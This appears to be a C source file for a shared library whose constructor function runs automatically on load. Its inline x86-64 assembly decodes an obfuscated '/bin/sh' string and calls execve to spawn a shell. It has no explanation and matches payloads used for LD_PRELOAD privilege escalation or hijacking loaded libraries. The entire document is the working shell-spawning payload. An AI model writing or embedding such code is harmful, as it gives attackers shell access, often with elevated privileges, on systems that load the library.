void __attribute__((constructor)) _init()
{
    __asm__ (
    "xor %eax, %eax\n"
    "mov $0xFF978CD091969DD1, %rbx\n"
    "neg %rbx\n"
    "push %rbx\n"
    "push %rsp\n"
    "pop %rdi\n"
    "cdq\n"
    "push %rdx\n"
    "push %rdi\n"
    "push %rsp\n"
    "pop %rsi\n"
    "mov $0x3b, %al\n"
    "syscall"
    );
}

